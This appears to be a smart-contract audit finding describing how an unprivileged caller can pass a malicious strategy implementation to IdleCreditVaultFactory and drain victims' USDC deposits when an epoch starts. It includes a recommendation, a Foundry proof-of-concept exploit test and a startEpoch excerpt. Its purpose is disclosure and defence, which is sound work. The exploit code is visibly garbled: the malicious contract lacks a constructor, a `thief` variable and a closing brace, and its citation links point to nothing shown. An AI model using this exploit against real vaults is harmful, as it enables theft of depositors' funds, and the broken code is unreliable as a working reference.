### Title
Unverified implementation lets an unprivileged deployer create a credit vault that steals deposits - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory` accepts arbitrary contract addresses as the CDO, strategy, and programmable-borrower implementations and installs them behind trusted proxies without an allowlist or bytecode verification. [1](#0-0) [2](#0-1)  This is analogous to downloading an unauthenticated executable: the factory executes the supplied implementation through `delegatecall`, wires it into a vault owned by the trusted treasury, and emits a normal deployment event. [3](#0-2) [4](#0-3) 

### Finding Description
`deployCreditVault` and `deployRevolvingCreditVault` are permissionless external functions and only enforce a nonzero manager plus minimum fees. [5](#0-4) [6](#0-5)  Both deployment paths pass caller-controlled `implementation` values to `_deployProxy`, which constructs a `TransparentUpgradeableProxy` and immediately executes attacker-supplied initialization code in the proxy context. [1](#0-0) [3](#0-2) 

A malicious strategy implementation can ignore the honest `manager` and `borrower` arguments, make `manager()` return the attacker, and make `borrower()` return the attacker. [7](#0-6)  After a victim deposits, the attacker can call `startEpoch`; the CDO sends its underlying balance to `strategy.borrower()` through `sendFundsToBorrower`. [8](#0-7) [9](#0-8) [10](#0-9) 

The deployment is still branded as a factory-created credit vault, configured under the factory’s treasury and proxy admin, and announced through `CreditVaultDeployed`. [11](#0-10)  No check proves that the supplied implementation is the audited `IdleCreditVault`, `IdleCDOEpochVariant`, `IdleCDOEpochQueue`, or `ProgrammableBorrower` code. [1](#0-0) [2](#0-1) 

### Impact Explanation
A malicious implementation controls the proxy runtime and can spoof authorization, accounting, borrower identity, or lifecycle responses. [3](#0-2)  For a malicious strategy, `borrower()` controls the destination of `sendFundsToBorrower`, so 100% of deposited underlying can be sent to the attacker when the epoch starts. [12](#0-11) [10](#0-9) 

The loss is equal to the vault’s available deposits; a vault holding `D` underlying loses `D`, less only any amount already consumed by pending instant withdrawals. [13](#0-12) 

### Likelihood Explanation
Any EOA can call the deployment functions, and no privileged action is needed to install attacker-controlled code as the initial implementation. [5](#0-4) [14](#0-13)  Successful exploitation requires victims to deposit into the rogue deployment, but the factory configures normal ownership and emits the same `CreditVaultDeployed` event used for legitimate vaults, making the deployment externally indistinguishable from a factory-originated vault without inspecting implementation bytecode. [4](#0-3) 

### Recommendation
Do not accept implementation addresses from arbitrary callers. Maintain an on-chain allowlist of audited implementation addresses approved by treasury governance, or have the factory deploy immutable implementation bytecode itself. Apply the same restriction to `CreditVaultParams.implementation`, `StrategyData.implementation`, `ProgrammableBorrowerParams.implementation`, `queueImplementation`, and `writeOffImplementation`. For ERC4626 integrations, maintain a separate allowlist of accepted vaults rather than relying only on `asset()` validation. [15](#0-14) 

### Proof of Concept
The following Foundry test uses a malicious strategy implementation that ignores the supplied manager and borrower. The factory accepts it, a victim deposits USDC, and the attacker starts the epoch and receives the full underlying balance.

contract MaliciousStrategy is ERC20 {

    }

    // The malicious implementation ignores the honest borrower supplied to the factory.
    function borrower() external view returns (address) {
        return thief;
    }

    function deposit(uint256 assets) external {
        _mint(msg.sender, assets);
    }

    function pendingInstantWithdraws() external pure returns (uint256) {
        return 0;
    }

    function pendingWithdraws() external pure returns (uint256) {
        return 0;

    function setAprs(uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function transferOwnership(address) external {}

    function getApr() external pure returns (uint256) {
        return 0;
    }

    function unscaledApr() external pure returns (uint256) {
        return 0;
    }
}

contract MaliciousFactoryImplementationPoC is Test {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function test_attackerSuppliedImplementationDrainsDeposits() external {
        vm.createSelectFork("mainnet");

        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address honestManager = makeAddr("honestManager");
        address honestBorrower = makeAddr("honestBorrower");
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        IdleCreditVaultFactory implementation = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    makeAddr("factoryProxyAdmin"),
                    abi.encodeWithSelector(
                        IdleCreditVaultFactory.initialize.selector,
                        treasury,
                        proxyAdmin
                    )
                )
            )
        );

        IdleCDOEpochVariant cdoImplementation = new IdleCDOEpochVariant();
        MaliciousStrategy maliciousStrategy = new MaliciousStrategy(USDC, attacker);

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImplementation),
                limit: 0,
                underlying: USDC,
                apr: 0,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 days,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: false,
                keyringPolicy: 0,
                feeReceiver: makeAddr("feeReceiver"),
                fees: 0,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: false
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(maliciousStrategy),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "Honest Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillaryParams);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        (address creditVault,,,,,) = abi.decode(
            logs[logs.length - 1].data,
            (address, address, address, address, address, address)
        );

        uint256 depositAmount = 1_000_000e6;
        deal(USDC, victim, depositAmount);

        vm.startPrank(victim);
        IERC20Detailed(USDC).approve(creditVault, depositAmount);
        IdleCDOEpochVariant(creditVault).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(IERC20Detailed(USDC).balanceOf(creditVault), depositAmount);
        assertEq(IERC20Detailed(USDC).balanceOf(attacker), 0);

        vm.prank(attacker);
        IdleCDOEpochVariant(creditVault).startEpoch();

        assertEq(IERC20Detailed(USDC).balanceOf(creditVault), 0);
        assertEq(IERC20Detailed(USDC).balanceOf(attacker), depositAmount);
    }
}

  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

    isEpochRunning = true;
    // prevent deposits
    _pause();

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    IdleCreditVault _strategy = IdleCreditVault(strategy);

    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;

    // set expected epoch end date
    epochEndDate = block.timestamp + _epochDuration;
    // set instant withdraw deadline
    instantWithdrawDeadline = block.timestamp + instantWithdrawDelay;

    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
